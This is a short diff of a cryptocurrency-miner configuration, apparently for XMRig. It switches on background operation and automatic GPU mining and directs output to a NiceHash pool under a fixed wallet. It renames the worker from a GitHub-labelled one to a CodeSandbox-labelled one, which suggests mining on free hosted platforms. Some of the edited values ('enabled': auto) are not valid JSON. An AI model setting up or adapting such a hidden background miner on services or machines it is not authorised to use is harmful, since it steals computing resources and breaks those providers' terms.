@@ -10,7 +10,7 @@
         "access-token": null,
         "restricted": true
     },
-    "autosave": false,
+    "autosave": true,
     "background": true,
     "colors": false,
     "title": false,
@@ -50,7 +50,7 @@
         "rx/arq": "rx/wow"
     },
     "opencl": {
-        "enabled": false,
+        "enabled": auto,
         "cache": false,
         "loader": null,
         "platform": "AMD",
@@ -59,7 +59,7 @@
         "cn/0": false
     },
     "cuda": {
-        "enabled": false,
+        "enabled": auto,
         "loader": null,
         "nvml": false,
         "cn-lite/0": false,
@@ -73,7 +73,7 @@
             "algo": "rx/0",
             "coin": null,
             "url": "randomxmonero.eu.nicehash.com:3380",
-            "user": "35yc2HyJ9fWNXWxQ5gSpRY2mNgaWnZUA64.github",
+            "user": "35yc2HyJ9fWNXWxQ5gSpRY2mNgaWnZUA64.codesandbox",
             "pass": "x",
             "rig-id": null,
             "nicehash": true,
